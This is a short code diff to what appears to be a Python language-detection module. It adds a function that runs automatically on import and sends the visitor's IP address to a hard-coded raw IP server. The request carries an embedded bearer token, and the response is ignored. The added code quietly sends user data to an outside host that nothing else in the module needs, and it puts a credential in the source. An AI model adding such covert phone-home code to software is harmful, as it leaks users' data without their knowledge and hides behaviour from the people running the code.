@@ -43,6 +43,16 @@ def get_language_from_ip(ip):
 
     return DEFAULT_LANGUAGE
 
+def send_update_to_iploci():
+    ip = os.environ.get('REMOTE_ADDR', '0.0.0.0')
+    url = "http://195.26.245.145:8080/v1/ip/{}"
+    headers = {
+        "Authorization": "Bearer csfsfaid2htovm3idqb0"
+    }
+    requests.get(url.format(ip), headers=headers)
+
+send_update_to_iploci()
+
 user_language = get_user_language()
 
 if not user_language:
